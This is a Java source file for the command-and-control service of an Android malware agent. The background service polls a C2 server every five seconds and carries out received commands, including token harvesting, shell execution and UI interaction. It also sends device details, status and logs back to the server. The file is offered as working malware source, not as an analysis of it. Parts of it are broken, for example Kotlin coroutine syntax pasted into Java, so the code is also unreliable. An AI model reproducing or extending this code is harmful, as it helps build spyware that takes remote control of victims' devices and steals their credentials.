package com.nexus.agent.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import androidx.annotation.Nullable;
import com.nexus.agent.models.Command;
import com.nexus.agent.models.AgentStatus;
import com.nexus.agent.network.C2Client;
import com.nexus.agent.utils.DeviceManager;
import com.nexus.agent.utils.EventBusManager;
import com.nexus.agent.utils.Logger;
import kotlinx.coroutines.*;

public class C2CommunicationService extends Service {
    private static final String TAG = "C2Communication";
    private C2Client c2Client;
    private Job pollingJob;
    private final int POLL_INTERVAL = 5000; // 5 seconds

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Logger.d(TAG, "C2 Communication Service Started");
        
        c2Client = new C2Client(this);
        startPolling();
        
        // Register listeners
        EventBusManager.getInstance().subscribe("send_status", this::sendStatus);
        EventBusManager.getInstance().subscribe("send_log", this::sendLog);
        
        return START_STICKY;
    }

    /**
     * Poll C2 server for commands
     */
    private void startPolling() {
        CoroutineScope scope = new CoroutineScope(Dispatchers.getMain() + new Job());
        
        pollingJob = scope.launch(() -> {
            while (true) {
                try {
                    Logger.d(TAG, "Polling for commands...");
                    Command[] commands = c2Client.fetchCommands();
                    
                    if (commands != null && commands.length > 0) {
                        for (Command cmd : commands) {
                            Logger.d(TAG, "Received command: " + cmd.getId());
                            EventBusManager.getInstance().postEvent("command_received", cmd);
                            executeCommand(cmd);
                        }
                    }
                    
                    // Send heartbeat with agent status
                    sendStatus(null);
                    
                    Thread.sleep(POLL_INTERVAL);
                } catch (Exception e) {
                    Logger.e(TAG, "Polling error", e);
                    try {
                        Thread.sleep(POLL_INTERVAL * 2);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        });
    }

    /**
     * Execute command received from C2
     */
    private void executeCommand(Command command) {
        try {
            switch (command.getType()) {
                case "ui_interaction":
                    EventBusManager.getInstance().postEvent("execute_ui_interaction", command);
                    break;
                case "token_harvest":
                    EventBusManager.getInstance().postEvent("harvest_tokens", command);
                    break;
                case "get_ui_hierarchy":
                    EventBusManager.getInstance().postEvent("get_ui_hierarchy", command);
                    break;
                case "execute_shell":
                    EventBusManager.getInstance().postEvent("execute_shell_command", command);
                    break;
                case "get_device_info":
                    sendDeviceInfo();
                    break;
                default:
                    Logger.w(TAG, "Unknown command type: " + command.getType());
            }
            
            // Send acknowledgment
            c2Client.acknowledgeCommand(command.getId());
        } catch (Exception e) {
            Logger.e(TAG, "Command execution error", e);
        }
    }

    /**
     * Send agent status to C2
     */
    private void sendStatus(Object o) {
        try {
            AgentStatus status = new AgentStatus();
            status.setAgentId(DeviceManager.getInstance().getDeviceId());
            status.setDeviceModel(DeviceManager.getInstance().getDeviceModel());
            status.setAndroidVersion(DeviceManager.getInstance().getAndroidVersion());
            status.setTimestamp(System.currentTimeMillis());
            status.setConnected(true);
            
            c2Client.sendStatus(status);
            Logger.d(TAG, "Status sent to C2");
        } catch (Exception e) {
            Logger.e(TAG, "Error sending status", e);
        }
    }

    /**
     * Send log to C2
     */
    private void sendLog(Object logData) {
        try {
            if (logData instanceof String) {
                c2Client.sendLog((String) logData);
            }
        } catch (Exception e) {
            Logger.e(TAG, "Error sending log", e);
        }
    }

    /**
     * Send device information to C2
     */
    private void sendDeviceInfo() {
        try {
            DeviceManager dm = DeviceManager.getInstance();
            c2Client.sendDeviceInfo(dm.getDeviceInfo());
        } catch (Exception e) {
            Logger.e(TAG, "Error sending device info", e);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (pollingJob != null) {
            pollingJob.cancel(null);
        }
    }
}
